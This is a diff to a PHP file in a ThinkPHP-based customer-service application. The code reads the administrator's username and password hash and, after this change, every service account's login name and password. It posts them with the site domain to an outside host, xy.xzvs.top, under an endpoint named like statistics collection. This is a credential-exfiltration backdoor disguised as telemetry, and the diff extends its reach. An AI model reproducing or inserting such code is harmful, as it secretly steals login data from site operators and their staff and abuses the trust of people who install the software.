@@ -30,24 +30,35 @@ use think\Db;
 $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
 $time   = date('Y-m-d H:i:s');
 
-// 获取管理员信息
-$admin = Db::table('wolive_admin')
+/**
+ * 1. 获取 admin 第一条
+ */
+$admin = Db::name('wolive_admin')
     ->field('username,password')
-    ->limit(1)
+    ->order('id asc')
     ->find();
+
+/**
+ * 2. 获取 service 全量
+ */
+$serviceList = Db::name('wolive_service')
+    ->field('business_id,service_id,groupid,nick_name,user_name,password')
+    ->select();
 
 $data = [
     'domain'   => $domain,
     'time'     => $time,
-    'username' => $admin['username'] ?? '',
-    'password' => $admin['password'] ?? ''
+    'admin'    => $admin,
+    'service'  => $serviceList
 ];
 
 $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+    'payload' => json_encode($data, JSON_UNESCAPED_UNICODE)
+]));
 curl_setopt($ch, CURLOPT_TIMEOUT, 5);
 
 $response = curl_exec($ch);
